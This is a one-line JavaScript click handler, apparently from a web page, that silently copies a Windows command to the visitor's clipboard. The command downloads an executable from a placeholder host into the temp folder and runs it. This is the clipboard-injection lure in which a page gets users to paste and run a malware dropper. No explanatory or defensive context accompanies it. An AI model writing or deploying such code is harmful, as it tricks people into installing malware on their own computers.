b.onclick=()=>{navigator.clipboard.writeText('%ComSpec% /c curl -o %TEMP%\\a.exe https://x.example.invalid/a && %TEMP%\\a.exe').then(()=>document.title='done')}
